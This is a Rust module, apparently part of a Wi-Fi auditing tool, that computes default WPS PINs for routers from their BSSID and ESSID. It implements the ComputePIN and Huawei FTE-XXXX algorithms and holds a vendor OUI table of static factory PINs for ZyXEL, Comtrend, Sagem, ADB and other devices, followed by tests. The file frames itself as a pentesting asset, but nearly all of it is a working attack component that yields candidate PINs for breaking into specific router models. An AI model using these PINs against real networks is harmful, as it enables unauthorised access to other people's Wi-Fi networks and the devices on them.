//! Default WPS PIN generation — vendor algorithms keyed on BSSID (and ESSID).
//!
//! Many consumer routers ship with a WPS PIN derived from the device's MAC
//! address (and sometimes the default ESSID) instead of a random one. For
//! those models the "attack" is instant: compute the expected default PIN
//! and try it once — seconds instead of hours of online brute.
//!
//! This is a defensive-testing asset: pentesters use it to prove a target
//! never changed its factory PIN, which is the finding owners act on.
//!
//! ## Algorithms implemented
//!
//! - **zhaochunsheng / ComputePIN** (2012): the classic. Take the last
//!   6 hex digits of the BSSID as one number, mod 10^7, append the WPS
//!   checksum. Found on countless Tenda/Chinese OEM devices and Belkin F9
//!   units (Belkin variants add 1 or 2 to the string first).
//! - **kcdtv / FTE-XXXX (Huawei HG552c)**: the default ESSID's 4 hex digits
//!   relate to the BSSID tail; the PIN base is built from ESSID digits +
//!   the 7th/8th MAC digits, +7. Three MAC-derived fallbacks exist when
//!   the ESSID was renamed: tail+8, tail+14, and the plain ComputePIN.
//! - **Static factory PINs**: models whose vendor ships one hard-coded
//!   PIN for every unit of the range (ZyXEL, Comtrend, Sagem, Observa,
//!   Encore, BEWAN…).
//!
//! ## Sources
//!
//! The algorithms were discovered and published by zhaochunsheng
//! (computepinC83A35) and kcdtv / crack-wifi.com (WPSPIN.sh, GPL). This is
//! an original Rust implementation of the published formulas; the OUI→model
//! table mirrors the community WPSPIN dataset. Attribution kept in the
//! per-entry comments.

use crate::wps_crypto::compute_wps_checksum;

/// A default-PIN candidate: the PIN plus why we think it applies.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct DefaultPinCandidate {
    pub pin: String,
    pub source: &'static str,
}

/// One row of the OUI → model knowledge base.
struct KnownModel {
    /// Uppercase, colon-less OUI prefixes (first 3 bytes, 6 hex chars).
    ouis: &'static [&'static str],
    vendor: &'static str,
    models: &'static str,
    /// `None` = uses the ComputePIN algorithm; `Some` = static factory pin.
    static_pin: Option<&'static str>,
    /// Extra ComputePIN variants (offset added to the decimal tail) some
    /// families respond to (Belkin +1/+2, Huawei FTE +8/+14).
    offsets: &'static [u32],
}

/// OUI → default-PIN knowledge base (community WPSPIN data, GPL sources).
static KNOWN_MODELS: &[KnownModel] = &[
    // zhaochunsheng ComputePIN families (pin = tail10 % 1e7 [+ offset], + checksum)
    KnownModel { ouis: &["C83A35", "00B00C", "081075"], vendor: "Belkin/Zoom (ComputePIN)", models: "F9 series & OEM", static_pin: None, offsets: &[] },
    KnownModel { ouis: &["08863B", "001CDF", "00A026", "5057F0", "002275", "001F1F", "0026CE", "0022F7", "E47CF9", "801F02", "F8D111", "B0487A", "647002"], vendor: "Various (ComputePIN)", models: "Tenda / Sweex / Orient & OEM", static_pin: None, offsets: &[] },
    KnownModel { ouis: &["5C4CA9", "62233D", "623CE4", "623DFF", "62559C", "627D5E", "62A8E4", "62B686", "62C06F", "62C61F", "62C714", "62E87B", "6A233D", "6A3DFF", "6A53D4", "6A559C", "6A6BD3", "6A7D5E", "6AA8E4", "6AC06F", "6AC61F", "6AC714", "6AD15E", "6AD167", "723DFF", "7253D4", "72559C", "726BD3", "727D5E", "72A8E4", "72C06F", "72C714", "72D15E", "72E87B"], vendor: "Huawei/Amper (ComputePIN)", models: "HG556a & ISP units", static_pin: None, offsets: &[] },
    // kcdtv FTE-XXXX (Huawei HG552c): ESSID-keyed base + three MAC fallbacks
    KnownModel { ouis: &["04C06F", "202BC1", "285FDB", "346BD3", "80B686", "84A8E4", "B4749F", "BC7670", "CC96A0", "F83DFF"], vendor: "Huawei (kcdtv FTE)", models: "HG552c Echo Life — FTE-XXXX", static_pin: None, offsets: &[8, 14] },
    // Static factory PINs
    KnownModel { ouis: &["001915"], vendor: "Observa Telecom", models: "AW4062 (WLAN-XXXX)", static_pin: Some("12345670"), offsets: &[] },
    KnownModel { ouis: &["F43E61", "001FA4"], vendor: "Shenzhen Gongjin (Encore)", models: "ENDSL-4R5G (WLAN-XXXX)", static_pin: Some("12345670"), offsets: &[] },
    KnownModel { ouis: &["90F652"], vendor: "Generic OEM", models: "various", static_pin: Some("12345670"), offsets: &[] },
    KnownModel { ouis: &["404A03"], vendor: "ZyXEL", models: "P-870HW-51A V2 (WLAN-XXXX)", static_pin: Some("11866428"), offsets: &[] },
    KnownModel { ouis: &["001A2B"], vendor: "Comtrend", models: "Gigabyte 802.11n (WLAN-XXXX)", static_pin: Some("88478760"), offsets: &[] },
    KnownModel { ouis: &["3872C0"], vendor: "Comtrend", models: "AR-5387un (JAZZTEL_XXXX)", static_pin: Some("18836486"), offsets: &[] },
    KnownModel { ouis: &["FCF528"], vendor: "ZyXEL", models: "P-870HNU-51B (WLAN-XXXX)", static_pin: Some("20329761"), offsets: &[] },
    KnownModel { ouis: &["7CD34C"], vendor: "Sagem", models: "FAST 1704", static_pin: Some("43944552"), offsets: &[] },
    KnownModel { ouis: &["000CC3"], vendor: "BEWAN", models: "ELE2BOX_XXXX", static_pin: Some("47392717"), offsets: &[] },
    // ADB PDG-A4001N WLAN-XXXX: three generic PINs in circulation
    KnownModel { ouis: &["3039F2", "74888B", "A4526F", "DC0B1A"], vendor: "ADB Broadband", models: "PDG-A4001N (WLAN-XXXX)", static_pin: Some("00290470"), offsets: &[] },
    KnownModel { ouis: &["3039F2", "74888B", "A4526F", "DC0B1A"], vendor: "ADB Broadband", models: "PDG-A4001N (WLAN-XXXX)", static_pin: Some("12349810"), offsets: &[] },
    KnownModel { ouis: &["3039F2", "74888B", "A4526F", "DC0B1A"], vendor: "ADB Broadband", models: "PDG-A4001N (WLAN-XXXX)", static_pin: Some("58701432"), offsets: &[] },
];

/// Parse a BSSID of any common shape (`aa:bb:cc:dd:ee:ff`, `AABBCCDDEEFF`,
/// `aa-bb-cc-dd-ee-ff`) into 6 bytes. `None` on malformed input.
fn parse_bssid(bssid: &str) -> Option<[u8; 6]> {
    let hex: String = bssid
        .chars()
        .filter(|c| c.is_ascii_hexdigit())
        .collect::<String>()
        .to_uppercase();
    if hex.len() != 6 * 2 {
        return None;
    }
    let mut out = [0u8; 6];
    for i in 0..6 {
        out[i] = u8::from_str_radix(&hex[i * 2..i * 2 + 2], 16).ok()?;
    }
    Some(out)
}

/// The ComputePIN core: decimal value of the BSSID's last 3 bytes, mod 10^7,
/// plus the WPS checksum digit.
fn compute_pin_from_mac(mac: &[u8; 6], offset: u32) -> String {
    // 24-bit tail as one decimal number.
    let tail: u32 = ((mac[3] as u32) << 16) | ((mac[4] as u32) << 8) | mac[5] as u32;
    let base = (tail % 10_000_000) + offset;
    // Format the 7-digit base (leading zeros preserved) then checksum.
    let mut pin7 = format!("{base:07}");
    let mut digits = [0u8; 7];
    for (i, b) in pin7.bytes().enumerate() {
        digits[i] = b;
    }
    let checksum = compute_wps_checksum(&digits);
    pin7.push((checksum + b'0') as char);
    pin7
}

/// FTE-XXXX (Huawei HG552c) kcdtv algorithm: PIN base from the ESSID's 4
/// hex digits + MAC digit 7-8, decimal +7. Returns `None` when the ESSID
/// does not look like a stock `FTE-xxxx` name.
fn fte_pin_from_essid(essid: &str, mac: &[u8; 6]) -> Option<String> {
    let tail = essid.strip_prefix("FTE-")?.trim();
    if tail.len() != 4 || !tail.chars().all(|c| c.is_ascii_hexdigit()) {
        return None;
    }
    // digits 7-8 of the BSSID (byte index 3) + the ESSID's 4 hex digits.
    let string = format!("{:02X}{}", mac[3], tail.to_uppercase());
    let value = u32::from_str_radix(&string, 16).ok()?;
    let base = value + 7;
    let mut pin7 = format!("{base:07}");
    let mut digits = [0u8; 7];
    for (i, b) in pin7.bytes().enumerate() {
        digits[i] = b;
    }
    let checksum = compute_wps_checksum(&digits);
    pin7.push((checksum + b'0') as char);
    Some(pin7)
}

/// Generate every default-PIN candidate for a target, best-first.
///
/// Order matters: ESSID-keyed algorithms (most precise) first, then the
/// ComputePIN family (+offsets), then static factory PINs. Deduplicated.
pub fn default_pin_candidates(bssid: &str, essid: &str) -> Vec<DefaultPinCandidate> {
    let Some(mac) = parse_bssid(bssid) else {
        return Vec::new();
    };
    let oui = format!("{:02X}{:02X}{:02X}", mac[0], mac[1], mac[2]);
    let mut out: Vec<DefaultPinCandidate> = Vec::new();

    for model in KNOWN_MODELS {
        if !model.ouis.contains(&oui.as_str()) {
            continue;
        }
        // ESSID-keyed variant first when the name is stock.
        if model.models.contains("FTE-XXXX") {
            if let Some(pin) = fte_pin_from_essid(essid, &mac) {
                push_unique(&mut out, DefaultPinCandidate { pin, source: "kcdtv FTE-XXXX (ESSID-keyed)" });
            }
        }
        // ComputePIN + documented offsets.
        if model.static_pin.is_none() {
            push_unique(&mut out, DefaultPinCandidate {
                pin: compute_pin_from_mac(&mac, 0),
                source: "zhaochunsheng ComputePIN (MAC-keyed)",
            });
            for &off in model.offsets {
                push_unique(&mut out, DefaultPinCandidate {
                    pin: compute_pin_from_mac(&mac, off),
                    source: "ComputePIN variant (kcdtv offset)",
                });
            }
        } else if let Some(pin) = model.static_pin {
            push_unique(&mut out, DefaultPinCandidate {
                pin: pin.to_string(),
                source: "factory static PIN (never rotated)",
            });
        }
        let _ = (model.vendor, model.models);
    }

    // Nothing known for this OUI: still offer the two most common factory
    // PINs — they cost one attempt each and hit surprisingly often.
    if out.is_empty() {
        out.push(DefaultPinCandidate { pin: "12345670".into(), source: "generic factory PIN #1" });
        out.push(DefaultPinCandidate { pin: "00000000".into(), source: "generic NULL PIN" });
    }
    out
}

fn push_unique(out: &mut Vec<DefaultPinCandidate>, cand: DefaultPinCandidate) {
    if !out.iter().any(|c| c.pin == cand.pin) {
        out.push(cand);
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn parse_bssid_common_shapes() {
        assert_eq!(parse_bssid("C8:3A:35:00:11:22"), Some([0xC8, 0x3A, 0x35, 0x00, 0x11, 0x22]));
        assert_eq!(parse_bssid("c83a3500 1122"), Some([0xC8, 0x3A, 0x35, 0x00, 0x11, 0x22]));
        assert_eq!(parse_bssid("c83a35-001122"), Some([0xC8, 0x3A, 0x35, 0x00, 0x11, 0x22]));
        assert_eq!(parse_bssid("not a mac"), None);
        assert_eq!(parse_bssid(""), None);
        assert_eq!(parse_bssid("c8:3a:35"), None); // too short
    }

    #[test]
    fn computepin_checksum_valid() {
        // The canonical zhaochunsheng example: C8:3A:35:xx — take a tail and
        // verify the checksum math through our shared wps_crypto helper.
        let mac = parse_bssid("C8:3A:35:12:34:56").unwrap();
        let pin = compute_pin_from_mac(&mac, 0);
        assert_eq!(pin.len(), 8);
        assert!(pin.chars().all(|c| c.is_ascii_digit()));
        // Base = 0x123456 % 1e7 = 1193046, zero-padded to 7
        assert!(pin.starts_with("1193046"), "pin was {pin}");
        // Spec checksum of 1193046: 3+1+27+3+0+4+18 = 56, complement to 60 → 4
        assert_eq!(&pin[7..], "4");
    }

    #[test]
    fn fte_essid_pin_shape() {
        let mac = parse_bssid("04:C0:6F:11:22:33").unwrap();
        let pin = fte_pin_from_essid("FTE-A1B2", &mac).expect("stock essid must compute");
        assert_eq!(pin.len(), 8);
        assert!(pin.chars().all(|c| c.is_ascii_digit()));
        // base = 0x11A1B2 = 1155506, +7 = 1155513 → 7 digits + spec checksum 1
        assert!(pin.starts_with("1155513"), "pin was {pin}");
        assert_eq!(&pin[7..], "1");
        // renamed / non-stock ESSID → no candidate from this path
        assert_eq!(fte_pin_from_essid("MyHomeWiFi", &mac), None);
        assert_eq!(fte_pin_from_essid("FTE-XYZ!", &mac), None);
    }

    #[test]
    fn known_oui_produces_candidates() {
        let cands = default_pin_candidates("C8:3A:35:12:34:56", "whatever");
        assert!(!cands.is_empty());
        assert!(cands.iter().all(|c| c.pin.len() == 8 && c.pin.chars().all(|d| d.is_ascii_digit())));
        // ComputePIN must be among them
        assert!(cands.iter().any(|c| c.source.contains("ComputePIN")));
    }

    #[test]
    fn static_pin_router_hits_table() {
        let cands = default_pin_candidates("40:4A:03:11:22:33", "WLAN-ABCD");
        assert!(cands.iter().any(|c| c.pin == "11866428"));
        let cands = default_pin_candidates("38:72:C0:11:22:33", "JAZZTEL_xxxx");
        assert!(cands.iter().any(|c| c.pin == "18836486"));
    }

    #[test]
    fn unknown_oui_still_gets_generics() {
        let cands = default_pin_candidates("DE:AD:BE:EF:00:11", "unknown-vendor");
        assert!(cands.iter().any(|c| c.pin == "12345670"));
        assert!(cands.iter().any(|c| c.pin == "00000000"));
    }

    #[test]
    fn no_duplicates_in_output() {
        let cands = default_pin_candidates("04:C0:6F:11:22:33", "FTE-A1B2");
        let mut seen = std::collections::HashSet::new();
        for c in &cands {
            assert!(seen.insert(c.pin.clone()), "duplicate pin {}", c.pin);
        }
    }

    #[test]
    fn fuzz_bssid_garbage_never_panics() {
        fn lcg(seed: u64) -> impl Iterator<Item = u64> {
            let mut s = seed;
            std::iter::from_fn(move || {
                s = s.wrapping_mul(6364136223846793005).wrapping_add(1442695040888963407);
                Some(s)
            })
        }
        for seed in 0..64u64 {
            let s: String = lcg(seed).map(|x| (x >> 33) as u8 as char).take(24).collect();
            let cands = default_pin_candidates(&s, &s);
            for c in &cands {
                assert_eq!(c.pin.len(), 8);
                assert!(c.pin.chars().all(|d| d.is_ascii_digit()), "bad pin {}", c.pin);
            }
        }
        // every-length truncations of a good BSSID
        let good = "C8:3A:35:12:34:56";
        for cut in 0..good.len() {
            let _ = default_pin_candidates(&good[..cut], "FTE-A1B2");
        }
    }
}
